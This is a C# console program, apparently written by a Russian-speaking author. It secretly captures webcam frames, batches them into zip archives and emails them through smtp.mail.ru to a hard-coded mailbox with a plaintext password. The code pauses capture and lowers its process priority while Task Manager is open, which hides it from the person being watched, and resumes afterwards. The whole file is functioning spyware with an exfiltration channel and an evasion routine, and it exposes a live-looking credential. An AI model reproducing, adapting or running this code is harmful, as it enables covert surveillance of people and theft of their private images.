using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Threading.Tasks;
using AForge.Video;
using AForge.Video.DirectShow;

namespace ConsoleApp8
{
    static class Camera
    {
        private static readonly string _emailRecipient = "tseolezha@mail.ru";
        private static readonly string _emailSender = "tseolezha@mail.ru";
        private static readonly string _emailPassword = "FcFyAL6ZLcu5WHmGssNs";
        private static VideoCaptureDevice _videoSource;
        private static bool _isRunning = false;
        private static bool _isTaskManagerRunning = false;
        private static readonly string _desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        private static readonly string _saveFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "CameraPhotos");
        private static readonly int _photoLimit = 10;
        private static readonly object _lock = new object();

        public static void Run()
        {
            Console.WriteLine("Запуск камеры...");
            EnsureSaveFolderExists();
            StartCamera();
            Task.Run(MonitorTaskManagerAsync);

            // Infinite loop to keep the camera running
            while (true)
            {
                Thread.Sleep(1000); // Keep the application running, do not block execution.
            }
        }

        private static void EnsureSaveFolderExists()
        {
            if (!Directory.Exists(_saveFolder))
            {
                Directory.CreateDirectory(_saveFolder);
            }
        }

        private static void StartCamera()
        {
            if (_videoSource != null && _videoSource.IsRunning)
                return;

            var videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

            if (videoDevices.Count == 0)
            {
                Console.WriteLine("Камера не найдена!");
                return;
            }

            _videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
            _videoSource.NewFrame += OnNewFrameHandler;

            _videoSource.Start();
            Console.WriteLine("Камера успешно запущена.");
        }

        private static void OnNewFrameHandler(object sender, NewFrameEventArgs eventArgs)
        {
            lock (_lock)
            {
                if (!_isTaskManagerRunning)
                {
                    using (var resizedFrame = ResizeImage((Bitmap)eventArgs.Frame.Clone(), 320, 240))
                    {
                        SavePhoto(resizedFrame);
                    }
                }
            }
        }

        private static void SavePhoto(Bitmap frame)
        {
            try
            {
                string filePath = Path.Combine(_saveFolder, $"Photo_{DateTime.Now:yyyyMMdd_HHmmss}.jpg");
                using (MemoryStream ms = new MemoryStream())
                {
                    frame.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                    File.WriteAllBytes(filePath, ms.ToArray());
                }
                Console.WriteLine($"Фото сохранено: {filePath}");

                if (Directory.GetFiles(_saveFolder, "*.jpg").Length >= _photoLimit)
                {
                    ArchiveAndSendPhotos();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка при сохранении фото: {ex.Message}");
            }
        }

        private static void ArchiveAndSendPhotos()
        {
            try
            {
                string archivePath = Path.Combine(_saveFolder, "CameraPhotosArchive.zip");

                if (File.Exists(archivePath))
                {
                    File.Delete(archivePath);
                }

                using (var zip = new Ionic.Zip.ZipFile())
                {
                    zip.AddDirectory(_saveFolder, string.Empty);
                    zip.Save(archivePath);
                }

                SendEmailWithAttachment(archivePath);

                File.Delete(archivePath);

                foreach (var file in Directory.GetFiles(_saveFolder, "*.jpg"))
                {
                    File.Delete(file);
                }

                GC.Collect();
                Console.WriteLine("Фотографии отправлены и удалены.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка архивирования/отправки: {ex.Message}");
            }
        }

        private static void SendEmailWithAttachment(string archivePath)
        {
            try
            {
                var mailMessage = new MailMessage
                {
                    From = new MailAddress(_emailSender),
                    Subject = "Фотографии с веб-камеры",
                    Body = "Вложен архив с фотографиями."
                };
                mailMessage.To.Add(_emailRecipient);

                using (var fileStream = new FileStream(archivePath, FileMode.Open, FileAccess.Read))
                {
                    var attachment = new Attachment(fileStream, "CameraPhotosArchive.zip", "application/zip");
                    mailMessage.Attachments.Add(attachment);

                    var smtpClient = new SmtpClient("smtp.mail.ru")
                    {
                        Port = 587,
                        Credentials = new NetworkCredential(_emailSender, _emailPassword),
                        EnableSsl = true
                    };

                    smtpClient.Send(mailMessage);
                }

                Console.WriteLine("Архив отправлен.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка отправки: {ex.Message}");
            }
        }

        private static async Task MonitorTaskManagerAsync()
        {
            while (true)
            {
                bool isTaskManagerRunning = Process.GetProcessesByName("Taskmgr").Any();

                if (isTaskManagerRunning && !_isTaskManagerRunning)
                {
                    _isTaskManagerRunning = true;
                    ReduceResourceUsage();
                    Console.WriteLine("Диспетчер задач открыт. Уменьшение нагрузки.");
                }
                else if (!isTaskManagerRunning && _isTaskManagerRunning)
                {
                    _isTaskManagerRunning = false;
                    RestoreResourceUsage();
                    Console.WriteLine("Диспетчер задач закрыт. Восстановление работы.");
                }

                await Task.Delay(5000); // Проверяем состояние каждые 5 секунд.
            }
        }

        private static void ReduceResourceUsage()
        {
            try
            {
                if (_videoSource != null && _videoSource.IsRunning)
                {
                    _videoSource.SignalToStop(); // Полностью останавливаем видеопоток.
                    _videoSource.WaitForStop();
                    _videoSource = null;
                    Console.WriteLine("Захват кадров остановлен.");
                }

                // Устанавливаем минимальный приоритет для процесса.
                Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.Idle;

                // Сокращаем использование памяти.
                GC.Collect();
                GC.WaitForPendingFinalizers();

                Console.WriteLine("Нагрузка снижена: память и процессор освобождены.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка при снижении нагрузки: {ex.Message}");
            }
        }

        private static void RestoreResourceUsage()
        {
            try
            {
                if (_videoSource == null)
                {
                    StartCamera(); // Перезапускаем камеру.
                    Console.WriteLine("Камера перезапущена.");
                }

                // Восстанавливаем приоритет процесса.
                Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.Normal;
                Console.WriteLine("Приоритет процесса восстановлен.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка при восстановлении нагрузки: {ex.Message}");
            }
        }

        private static Bitmap ResizeImage(Bitmap original, int width, int height)
        {
            var resized = new Bitmap(width, height);
            using (var graphics = Graphics.FromImage(resized))
            {
                graphics.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed;
                graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Low;
                graphics.CompositingMode = System.Drawing.Drawing2D.CompositingMode.SourceCopy;
                graphics.DrawImage(original, 0, 0, width, height);
            }
            original.Dispose();
            return resized;
        }
    }
}
